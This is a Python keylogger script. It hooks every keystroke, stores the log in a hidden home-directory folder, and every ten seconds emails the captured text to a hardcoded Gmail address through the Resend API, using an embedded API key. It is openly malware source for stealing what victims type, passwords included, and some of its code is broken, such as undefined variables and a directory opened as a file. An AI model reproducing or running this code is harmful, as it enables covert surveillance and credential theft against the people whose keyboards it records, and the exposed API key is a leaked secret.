#/bin/python3
import os
import keyboard #for keylogs

import requests # for making HTTP requests
from threading import Timer
from datetime import datetime
import resend

SEND_REPORT_EVERY = 10 # (in seconds)



class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_date = datetime.now()
        self.end_date = datetime.now()



    def key_press(self, event):
        name = event.name
        if len(name) > 1:
            if name == 'space':
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def create_filename(self):
        start_date_str = str(self.start_date)[:7].replace(" ", "_").replace(":", "")
        end_date_str = str(self.end_date)[:-7].replace(" ", "_").replace(":", "")
        self.filename = f'keylog - {start_date_str}_{end_date_str}'

    def save(self):
        os.mkdir("/home/owhat/.key/logs")
        with open(f"/home/owhat/.key/logs", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
        return self.log

    def sendmail(self, email, key, title):
        message = self.save()


        resend.api_key = "re_exusRnQa_Df96cQ2E1VrsRJWomPkt5XUV"

        params: resend.Emails.SendParams = {
            "from": "Acme <onboarding@resend.dev>",
            "to": "hiowhat090@gmail.com",
            "subject": "hello world",
            "html": f"<strong>{message}</strong>",
        }

        email = resend.Emails.send(params)
        print(email)

    def report(self):
        if self.log:
            self.end_date = datetime.now()
            self.create_filename()
            if self.report_method == "email":
                self.sendmail(email, key, self.filename)

            print(f"[{self.filename}] - {self.log}")
            self.start_date = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_date = datetime.now()
        keyboard.on_release(callback=self.key_press)
        self.report()
        print(f"{datetime.now()} - started keylogger")
        keyboard.wait()

def main():
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()

if __name__ == "__main__":
    main()